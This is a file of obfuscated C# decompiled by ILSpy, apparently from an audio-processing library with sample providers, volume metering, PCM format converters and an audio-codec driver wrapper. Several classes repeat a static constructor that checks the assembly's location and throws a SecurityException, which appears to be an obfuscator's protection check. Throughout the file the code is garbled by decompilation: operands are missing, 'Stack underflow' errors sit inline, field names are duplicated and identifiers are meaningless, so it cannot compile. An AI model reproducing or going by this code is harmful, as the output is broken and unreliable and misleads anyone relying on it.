namespace _0012
{
	internal sealed class _0007 : _0015._000F
	{
		private const float m__0001 = (float)Math.PI / 2f;

		public _001D._000F _0001(float _0002)
		{
			//IL_0007: Unsupported input type for neg.
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			//IL_004a: Incompatible stack heights: 0 vs 2
			//IL_0051: Incompatible stack heights: 0 vs 2
			_ = global::_0015._009A_0002;
			Math.Sin((0 - /*Error near IL_0008: Stack underflow*/+ 1f) / 2f * ((float)Math.PI / 2f));
			float num = (float)/*Error near IL_001f: Stack underflow*/;
			_003F val = /*Error near IL_0027: Stack underflow*/* ((float)Math.PI / 2f);
			float num2 = (float)/*Error near IL_002d: Stack underflow*/((double)val);
			_001D._000F result = default(_001D._000F);
			result.Left = num;
			result.Right = num2;
			return result;
		}
	}
}
namespace _0080
{
	internal sealed class _0006 : global::_0015._000F
	{
		public _001D._000F _0001(float _0002)
		{
			//IL_0002: Unsupported input type for neg.
			//IL_0002: Unknown result type (might be due to invalid IL or missing references)
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Expected F4, but got Unknown
			//IL_003d: Incompatible stack heights: 0 vs 1
			float num = (0 - /*Error near IL_0003: Stack underflow*/+ 1f) / 2f;
			float num2 = (float)/*Error near IL_0014: Stack underflow*/;
			float num3 = 1f - num;
			_001D._000F result = default(_001D._000F);
			result.Left = num2;
			result.Right = num3;
			return result;
		}

		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0014._0001(107396751), _0014._0001(107396746)), _0014._0001(107396741), _0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0014._0001(107396706));
		}
	}
}
namespace _001E
{
	internal sealed class _000E : global::_0002._0007
	{
		private readonly global::_0002._0007 m__0001;

		private readonly float[] m__0001;

		private int m__0001;

		private readonly int _0002;

		private readonly global::_0011._0008 m__0001;

		[CompilerGenerated]
		private int _0003;

		[CompilerGenerated]
		private EventHandler<global::_0011._0008> m__0001;

		public int SamplesPerNotification
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000E)/*Error near IL_0009: Stack underflow*/)._0003 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public event EventHandler<global::_0011._0008> StreamVolume
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0011._0008> eventHandler = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
				EventHandler<global::_0011._0008> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0011._0008>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0011._0008> value2 = (EventHandler<global::_0011._0008>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0011._0008> eventHandler = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
				EventHandler<global::_0011._0008> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0011._0008>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0011._0008> value2 = (EventHandler<global::_0011._0008>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _000E(global::_0002._0007 _001D_0013)
			: this(_001D_0013, _001D_0013.WaveFormat._0001 / 10)
		{
		}

		public _000E(global::_0002._0007 _001D_0013, int _0094_0090_0006)
		{
			this.m__0001 = _001D_0013;
			_0002 = _001D_0013.WaveFormat._0001;
			this.m__0001 = new float[_0002];
			SamplesPerNotification = _0094_0090_0006;
			this.m__0001 = new global::_0011._0008
			{
				MaxSampleValues = this.m__0001
			};
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_00ca: Incompatible stack heights: 0 vs 1
			//IL_00d0: Incompatible stack heights: 0 vs 2
			//IL_00d6: Incompatible stack heights: 0 vs 1
			_ = ((_000E)/*Error near IL_000a: Stack underflow*/).m__0001;
			int num = ((global::_0002._0007)/*Error near IL_001a: Stack underflow*/)._0001((float[])/*Error near IL_001a: Stack underflow*/, (int)/*Error near IL_001a: Stack underflow*/, _0004);
			if (this.m__0001 != null)
			{
				for (int i = 0; i < num; i += this._0002)
				{
					for (int j = 0; j < this._0002; j++)
					{
						float num2 = _0016_0003._0092_0006(_0002[_0003 + i + j]);
						this.m__0001[j] = _0017_0003._0093_0006(this.m__0001[j], num2);
					}
					this.m__0001++;
					if (this.m__0001 >= SamplesPerNotification)
					{
						this.m__0001(this, this.m__0001);
						this.m__0001 = 0;
						_0007_0003._0086_0006(this.m__0001, 0, this._0002);
					}
				}
			}
			return num;
		}
	}
}
namespace _0011
{
	internal sealed class _0008 : EventArgs
	{
		[CompilerGenerated]
		private float[] _0001;

		public float[] MaxSampleValues
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0008)/*Error near IL_0009: Stack underflow*/)._0001 = (float[])/*Error near IL_0009: Stack underflow*/;
			}
		}

		static _0008()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (_0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0015
{
	internal sealed class _0010 : global::_0002._0007, global::_0001._0007
	{
		private global::_0002._0007 m__0001;

		private global::_0016._0008 m__0001 = new global::_0016._0008(0f, 0f);

		private int m__0001;

		[CompilerGenerated]
		private EventHandler<global::_0016._0008> m__0001;

		public global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0010)/*Error near IL_0007: Stack underflow*/).m__0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public event EventHandler<global::_0016._0008> Sample
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0016._0008> eventHandler = ((_0010)/*Error near IL_0007: Stack underflow*/).m__0001;
				EventHandler<global::_0016._0008> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0016._0008>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0016._0008> value2 = (EventHandler<global::_0016._0008>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0016._0008> eventHandler = ((_0010)/*Error near IL_0007: Stack underflow*/).m__0001;
				EventHandler<global::_0016._0008> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0016._0008>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0016._0008> value2 = (EventHandler<global::_0016._0008>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0010(global::_0002._0007 _001D_0013)
		{
			this.m__0001 = _001D_0013;
			this.m__0001 = WaveFormat._0001;
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_007e: Incompatible stack heights: 0 vs 1
			//IL_0084: Incompatible stack heights: 0 vs 2
			//IL_008a: Incompatible stack heights: 0 vs 1
			_ = ((_0010)/*Error near IL_0007: Stack underflow*/).m__0001;
			int num = ((global::_0002._0007)/*Error near IL_0017: Stack underflow*/)._0001((float[])/*Error near IL_0017: Stack underflow*/, (int)/*Error near IL_0017: Stack underflow*/, _0004);
			if (this.m__0001 != null)
			{
				for (int i = 0; i < num; i += this.m__0001)
				{
					this.m__0001.Left = _0002[_0003 + i];
					this.m__0001.Right = ((this.m__0001 > 1) ? _0002[_0003 + i + 1] : this.m__0001.Left);
					this.m__0001(this, this.m__0001);
				}
			}
			return num;
		}
	}
}
namespace _0007
{
	internal sealed class _000E : global::_0002._0007
	{
		private readonly global::_0002._0007 m__0001;

		internal float _0001;

		public global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public float Volume
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000E)/*Error near IL_0009: Stack underflow*/)._0001 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _000E(global::_0002._0007 _001D_0013)
		{
			this.m__0001 = _001D_0013;
			this._0001 = 1f;
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 2
			//IL_0047: Incompatible stack heights: 0 vs 1
			_ = ((_000E)/*Error near IL_0007: Stack underflow*/).m__0001;
			int result = ((global::_0002._0007)/*Error near IL_0011: Stack underflow*/)._0001((float[])/*Error near IL_0011: Stack underflow*/, (int)/*Error near IL_0011: Stack underflow*/, _0004);
			if (this._0001 != 1f)
			{
				for (int i = 0; i < _0004; i++)
				{
					_0002[_0003 + i] *= this._0001;
				}
			}
			return result;
		}

		static _000E()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0006
{
	internal sealed class _000E : global::_001C._0004
	{
		private global::_0002._0007 _0001;

		public global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_000E)/*Error near IL_0007: Stack underflow*/)._0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public _000E(global::_0002._0007 _001D_0013)
		{
			if (_001D_0013.WaveFormat._0001 != WaveFormatEncoding.IeeeFloat)
			{
				throw new ArgumentException(_0080._0014._0001(107384545));
			}
			_0001 = _001D_0013;
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Expected I4, but got Unknown
			//IL_002d: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0004: Stack underflow*// 4;
			_0080._0004 obj = new _0080._0004((byte[])/*Error near IL_000d: Stack underflow*/);
			return _0001._0001(obj.FloatBuffer, _0003 / 4, num) * 4;
		}

		static _000E()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _000F
{
	internal sealed class _0007 : global::_0002._0007
	{
		private readonly global::_0002._0007 m__0001;

		internal float[] _0001;

		[CompilerGenerated]
		private global::_0005._0005 m__0001;

		[CompilerGenerated]
		private float m__0001;

		[CompilerGenerated]
		private float _0002;

		public global::_0005._0005 WaveFormat
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0007)/*Error near IL_0009: Stack underflow*/).m__0001 = (global::_0005._0005)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public float LeftVolume
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0007)/*Error near IL_0009: Stack underflow*/).m__0001 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public float RightVolume
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0007)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0007)/*Error near IL_0009: Stack underflow*/)._0002 = (float)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public _0007(global::_0002._0007 _001D_0013)
		{
			LeftVolume = 1f;
			RightVolume = 1f;
			if (_001D_0013.WaveFormat._0001 != 1)
			{
				throw new ArgumentException(_0080._0014._0001(107384710));
			}
			this.m__0001 = _001D_0013;
			WaveFormat = global::_0011._0018._0001(_001D_0013.WaveFormat._0001, 2);
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0061: Incompatible stack heights: 0 vs 1
			//IL_0064: Expected I4, but got Unknown
			//IL_0067: Incompatible stack heights: 0 vs 1
			int num = /*Error near IL_0004: Stack underflow*// 2;
			int num2 = (int)/*Error near IL_0009: Stack underflow*/;
			global::_0011._0018._0001(num, this);
			int num3 = this.m__0001._0001(this._0001, 0, num);
			for (int i = 0; i < num3; i++)
			{
				_0002[num2++] = this._0001[i] * LeftVolume;
				_0002[num2++] = this._0001[i] * RightVolume;
			}
			return num3 * 2;
		}
	}
}
namespace _001A
{
	internal sealed class _0006 : _0080._0007
	{
		public _0006(_001C._0004 _001D_0013)
			: base(_001D_0013)
		{
			if (_001D_0013.WaveFormat._0001 != WaveFormatEncoding.IeeeFloat)
			{
				throw new ArgumentException(_0080._0014._0001(107384545));
			}
		}

		public override int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_0057: Expected I4, but got Unknown
			//IL_005a: Incompatible stack heights: 0 vs 1
			int count = /*Error near IL_0004: Stack underflow*/* 4;
			global::_0011._0018._0001((int)/*Error near IL_000e: Stack underflow*/, (_0080._0007)this);
			int num = base._0001.Read(base._0001, 0, count);
			int result = num / 4;
			int num2 = _0003;
			for (int i = 0; i < num; i += 4)
			{
				_0002[num2++] = _0018_0003._0094_0006(base._0001, i);
			}
			return result;
		}

		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0003
{
	internal sealed class _0007 : _0080._0007
	{
		public _0007(_001C._0004 _001D_0013)
			: base(_001D_0013)
		{
		}

		public override int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_0057: Expected I4, but got Unknown
			//IL_005a: Incompatible stack heights: 0 vs 1
			int count = /*Error near IL_0004: Stack underflow*/* 2;
			global::_0011._0018._0001((int)/*Error near IL_000e: Stack underflow*/, (_0080._0007)this);
			int num = base._0001.Read(base._0001, 0, count);
			int num2 = _0003;
			for (int i = 0; i < num; i += 2)
			{
				_0002[num2++] = (float)_0080_0002._0086_0005(base._0001, i) / 32768f;
			}
			return num / 2;
		}
	}
}
namespace _007F
{
	internal sealed class _000F : _0080._0007
	{
		public _000F(_001C._0004 _001D_0013)
			: base(_001D_0013)
		{
		}

		public override int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_0003: Unknown result type (might be due to invalid IL or missing references)
			//IL_0067: Incompatible stack heights: 0 vs 1
			//IL_006a: Expected I4, but got Unknown
			//IL_006d: Incompatible stack heights: 0 vs 1
			int count = /*Error near IL_0004: Stack underflow*/* 3;
			global::_0011._0018._0001((int)/*Error near IL_000e: Stack underflow*/, (_0080._0007)this);
			int num = base._0001.Read(base._0001, 0, count);
			int num2 = _0003;
			for (int i = 0; i < num; i += 3)
			{
				_0002[num2++] = (float)(((sbyte)base._0001[i + 2] << 16) | (base._0001[i + 1] << 8) | base._0001[i]) / 8388608f;
			}
			return num / 3;
		}

		static _000F()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _000E
{
	internal sealed class _0010 : _0080._0007
	{
		public _0010(global::_001C._0004 _001D_0013)
			: base(_001D_0013)
		{
		}

		public override int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
			int count = (int)/*Error near IL_0050: Stack underflow*/;
			global::_0011._0018._0001((int)/*Error near IL_000c: Stack underflow*/, (_0080._0007)this);
			int num = base._0001.Read(base._0001, 0, count);
			int num2 = _0003;
			for (int i = 0; i < num; i++)
			{
				_0002[num2++] = (float)(int)base._0001[i] / 128f - 1f;
			}
			return num;
		}
	}
}
namespace _0014
{
	internal sealed class _0006 : global::_0002._0007
	{
		private readonly global::_0007._000E m__0001;

		private readonly _001E._000E m__0001;

		private readonly global::_0005._0005 m__0001;

		public global::_0005._0005 WaveFormat => ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;

		public float Volume
		{
			get
			{
				//IL_000e: Incompatible stack heights: 0 vs 1
				return ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001._0001;
			}
			set
			{
				//IL_0010: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 2
				_ = ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
				((global::_0007._000E)/*Error near IL_000e: Stack underflow*/)._0001 = (float)/*Error near IL_000e: Stack underflow*/;
			}
		}

		public event EventHandler<global::_0011._0008> PreVolumeMeter
		{
			add
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 2
				_ = ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
				((_001E._000E)/*Error near IL_0017: Stack underflow*/).StreamVolume += (EventHandler<global::_0011._0008>)/*Error near IL_0017: Stack underflow*/;
			}
			remove
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 2
				_ = ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
				((_001E._000E)/*Error near IL_0017: Stack underflow*/).StreamVolume -= (EventHandler<global::_0011._0008>)/*Error near IL_0017: Stack underflow*/;
			}
		}

		public _0006(_001C._0004 _0095_0090_0006)
			: this(_0095_0090_0006, _0096_0090_0006: false)
		{
		}

		public _0006(_001C._0004 _0095_0090_0006, bool _0096_0090_0006)
		{
			global::_0002._0007 obj = global::_0011._0018._0001(_0095_0090_0006);
			if (obj.WaveFormat._0001 == 1 && _0096_0090_0006)
			{
				obj = new global::_000F._0007(obj);
			}
			this.m__0001 = obj.WaveFormat;
			this.m__0001 = new _001E._000E(obj);
			this.m__0001 = new global::_0007._000E(this.m__0001);
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 2
			//IL_0019: Incompatible stack heights: 0 vs 1
			_ = ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
			return ((global::_0007._000E)/*Error near IL_0011: Stack underflow*/)._0001((float[])/*Error near IL_0011: Stack underflow*/, (int)/*Error near IL_0011: Stack underflow*/, _0004);
		}

		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
	internal enum _0007
	{
		_0001 = 0,
		_0002 = 8,
		_0003 = 3,
		_0004 = 4
	}
	internal sealed class _0008 : IDisposable
	{
		internal static List<_0008> _0001;

		internal global::_0010._0008 _0001;

		internal IntPtr _0001;

		internal IntPtr _0002;

		private List<_0019._000E> m__0001;

		internal List<global::_0006._000F> _0001;

		internal IntPtr _0003;

		public int MaxFormatSize
		{
			get
			{
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_002a: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001(((_0008)/*Error near IL_0007: Stack underflow*/)._0002, global::_0005._0004._0013, out int result);
				_0080._0014._0001(107384681);
				global::_0011._0018._0001((MmResult)/*Error near IL_0019: Stack underflow*/, (string)/*Error near IL_0019: Stack underflow*/);
				return result;
			}
		}

		public string ShortName => ((_0008)/*Error near IL_0007: Stack underflow*/)._0001._0001;

		public string LongName => ((_0008)/*Error near IL_0007: Stack underflow*/)._0001._0002;

		public IntPtr DriverId => ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;

		public IEnumerable<_0019._000E> FormatTags
		{
			get
			{
				//IL_0087: Incompatible stack heights: 0 vs 1
				//IL_008d: Incompatible stack heights: 0 vs 1
				//IL_0097: Incompatible stack heights: 0 vs 1
				if (((_0008)/*Error near IL_000a: Stack underflow*/).m__0001 == null)
				{
					_ = ((_0008)/*Error near IL_0013: Stack underflow*/)._0002 == IntPtr.Zero;
					if ((int)/*Error near IL_001c: Stack underflow*/ != 0)
					{
						throw new InvalidOperationException(_0080._0014._0001(107384671));
					}
					this.m__0001 = new List<_0019._000E>();
					_001F._000E obj = default(_001F._000E);
					obj._0001 = Marshal.SizeOf((object)obj);
					global::_0011._0018._0001(global::_0011._0018._0001(_0002, ref obj, (global::_0008._0008._0003)_0001, IntPtr.Zero, 0), _0080._0014._0001(107384634));
				}
				return this.m__0001;
			}
		}

		internal _0008(IntPtr _0097_0090_0006)
		{
			this._0001 = _0097_0090_0006;
			this._0001 = default(global::_0010._0008);
			this._0001._0001 = Marshal.SizeOf((object)this._0001);
			global::_0011._0018._0001(global::_0011._0018._0001(_0097_0090_0006, ref this._0001, 0), _0080._0014._0001(107384696));
		}

		public override string _0003()
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			return ((_0008)/*Error near IL_0007: Stack underflow*/)._0001._0002;
		}

		private unsafe bool _0001(IntPtr _0002, ref _001F._000E _0003, IntPtr _0004, global::_0005._000E _0005)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 2
			//IL_0022: Incompatible stack heights: 0 vs 1
			_ = ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001;
			new _0019._000E(*(_001F._000E*)(nint)/*Error near IL_000a: Stack underflow*/);
			((List<_0019._000E>)/*Error near IL_0015: Stack underflow*/).Add((_0019._000E)/*Error near IL_0015: Stack underflow*/);
			return true;
		}

		internal unsafe bool _0001(IntPtr _0002, ref _001F._0008 _0003, IntPtr _0004, global::_0005._000E _0005)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 2
			//IL_0022: Incompatible stack heights: 0 vs 1
			_ = ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;
			new global::_0006._000F(*(_001F._0008*)(nint)/*Error near IL_000a: Stack underflow*/);
			((List<global::_0006._000F>)/*Error near IL_0015: Stack underflow*/).Add((global::_0006._000F)/*Error near IL_0015: Stack underflow*/);
			return true;
		}

		public void _0001()
		{
			//IL_0029: Incompatible stack heights: 0 vs 2
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._0099_0005;
			IntPtr intPtr = ((_0008)/*Error near IL_000c: Stack underflow*/)._0002;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0030: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				global::_0011._0018._0001((_0008)/*Error near IL_001c: Stack underflow*/);
				_0091_0002._009B_0005(this);
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}
	}
}
namespace _0010
{
	[StructLayout(LayoutKind.Sequential, Pack = 2)]
	internal struct _0008
	{
		public int _0001;

		public uint _0001;

		public uint _0002;

		public ushort _0001;

		public ushort _0002;

		public uint _0003;

		public uint _0004;

		public global::_0005._000E _0001;

		public int _0002;

		public int _0003;

		public IntPtr _0001;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
		public string _0001;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
		public string _0002;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
		public string _0003;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
		public string _0004;

